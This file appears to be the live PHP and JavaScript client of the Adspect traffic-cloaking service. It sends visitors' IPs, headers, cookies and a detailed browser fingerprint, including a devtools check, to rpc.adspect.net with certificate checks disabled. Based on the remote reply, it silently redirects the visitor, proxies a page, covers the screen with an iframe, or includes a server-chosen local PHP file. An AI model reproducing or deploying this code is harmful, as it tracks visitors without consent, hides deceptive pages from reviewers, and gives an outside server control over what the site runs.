<?php
 define('ADSPECT_DEBUG', 0); if (ADSPECT_DEBUG) { ini_set('display_errors', '1'); error_reporting(E_ALL); } else { ini_set('display_errors', '0'); } if (!function_exists('adspect')) { function adspect_coalesce($array, $keys, $default = '') { if (is_scalar($keys)) { $keys = array($keys); } foreach ($keys as $key) { if (array_key_exists($key, $array)) { return $array[$key]; } } return $default; } function adspect_render() { require_once func_get_arg(0); } function adspect($sid, $mode) { $ajax = $mode === 'ajax'; $curl = curl_init(); $ipaddr = adspect_coalesce($_SERVER, array( 'HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR' )); $proto = adspect_coalesce($_SERVER, 'SERVER_PROTOCOL', 'HTTP/1.1'); $ua = adspect_coalesce($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_coalesce($_SERVER, 'HTTP_REFERER'); $query = adspect_coalesce($_SERVER, 'QUERY_STRING'); $cookie = sha1(implode(':', array($sid, $ipaddr, $ua, $query))); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $headers = array(); foreach ($_SERVER as $key => $value) { if (substr_compare('HTTP_', $key, 0, 5) == 0) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } $payload['cookie'] = array($cookie, adspect_coalesce($_COOKIE, $cookie)); $payload['headers'] = $headers; curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); } $sid = adspect_coalesce($_GET, '__sid', $sid); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_HTTPHEADER, array( 'Adspect-IP: ' . $ipaddr, 'Adspect-UA: ' . $ua, 'Adspect-JS: ' . intval($ajax), 'Adspect-Referrer: ' . $referrer )); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $target = curl_exec($curl); if ($errno = curl_errno($curl)) { if (ADSPECT_DEBUG) { die('cURL error: ' . curl_strerror($errno)); } header("{$proto} 500 Internal Server Error", true, 500); die; } $status = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Content-Type: application/javascript'); header('Cache-Control: no-store'); switch ($status) { case 202: break; case 200: if ($ajax) { if ($target != '') { if ($_SERVER['REQUEST_METHOD'] === 'POST') { echo $target; } else { $target = json_encode($target); echo "window.__location = {$target};"; break; } } } elseif (!preg_match('/^[[:alnum:]]+:/i', $target)) { $target = parse_url($target); $query = adspect_coalesce($target, 'query'); parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; unset($_POST['data']); $_SERVER['REQUEST_METHOD'] = 'GET'; if (adspect_coalesce($target, 'path') === '') { return null; } $dirname = dirname($target['path']); if ($dirname[0] !== '/') { $dirname = __DIR__ . '/' . $dirname; } chdir($dirname); adspect_render(basename($target['path'])); } elseif ($mode === 'redirect' || !preg_match('/^https?:/i', $target)) { header("Location: {$target}"); } elseif ($mode === 'proxy') { $curl = curl_init(); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, $ua); curl_setopt($curl, CURLOPT_URL, $target); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $html = curl_exec($curl); curl_close($curl); $target = parse_url($target); $origin = $target['scheme'] . '://' . $target['host']; if (array_key_exists('port', $target)) { $origin .= ':' . $target['port']; } $dirurl = $origin . adspect_coalesce($target, 'path', '/'); $html = preg_replace('@(href|src)=(["\'])/(?!/)((?:(?!\2).)*)@i', "$1=$2{$origin}/$3", $html); $html = preg_replace('@(href|src)=(["\'])(?!(?:https?:)?//)((?:(?!\2).)*)@i', "$1=$2{$dirurl}/$3", $html); $html = preg_replace('@(href|src)=/(?!/)([^ ]*)@i', "$1={$origin}/$2", $html); $html = preg_replace('@(href|src)=(?!["\'])(?!(?:https?:)?//)([^ ]*)@i', "$1={$dirurl}/$2", $html); echo $html; } elseif ($mode === 'iframe') { $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; } die; case 404: header("{$proto} 404 Not Found", true, 404); die; default: if (ADSPECT_DEBUG) { die("cURL returned status code {$status}"); } header("{$proto} 503 Service Unavailable", true, 503); die; } setcookie($cookie, hash('crc32b', $cookie), time() + 60); return $target; } } $target = adspect('1eb33dd7-aa39-615c-ad09-ac1f6b95a853', 'ajax'); if ($target === null) { return; } ?>
(function(){function p(a){if(""!==a)switch(q.className){case "assign":window.location.assign(a);break;case "replace":window.location.replace(a);break;case "iframe":var b=document.createElement("iframe");b.style.cssText="width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;";b.src=a;document.body=document.createElement("body");document.body.appendChild(b)}}var d=[],c={},q=document.getElementById(btoa(window.location.origin));if(window.__location)return p(window.__location);
var l=function(){c.errors=d;var a=new FormData;a.append("data",JSON.stringify(c));var b=new XMLHttpRequest;b.open("POST",q.getAttribute("src"),!1);b.onreadystatechange=function(){4===this.readyState&&200===this.status&&p(this.responseText)};b.send(a)};try{var g=function(a){if("object"===typeof a&&null!==a){var b=function(k){try{var h=a[k];switch(typeof h){case "object":if(null===h)break;case "function":h=h.toString()}e[k]=h}catch(u){d.push(u.message)}},e={},f;for(f in a)b(f);try{var m=Object.getOwnPropertyNames(a);
for(f=0;f<m.length;++f)b(m[f]);e["!!"]=m}catch(k){d.push(k.message)}return e}};c.window=g(window);c.screen=g(window.screen);c.document=g(document);c.documentElement=function(a){try{var b={};a=a.attributes;for(var e in a)e=a[e],b[e.nodeName]=e.nodeValue;return b}catch(f){d.push(f.message)}}(document.documentElement);c.navigator=g(window.navigator);c.webassembly=g(window.WebAssembly);try{c.timezoneOffset=(new Date).getTimezoneOffset()}catch(a){d.push(a.message)}try{g=function(){};var r=0;g.toString=
function(){++r;return""};console.log(g);c.tostring=r}catch(a){d.push(a.message)}try{c.touchEvent=document.createEvent("TouchEvent").toString()}catch(a){d.push(a.message)}try{var n=document.createElement("canvas").getContext("webgl"),t=n.getExtension("WEBGL_debug_renderer_info");c.webgl={vendor:n.getParameter(t.UNMASKED_VENDOR_WEBGL),renderer:n.getParameter(t.UNMASKED_RENDERER_WEBGL)}}catch(a){d.push(a.message)}window.navigator.permissions.query({name:"notifications"}).then(function(a){c.permissions=
[window.Notification.permission,a.state];l()},l)}catch(a){d.push(a.message),l()}})();
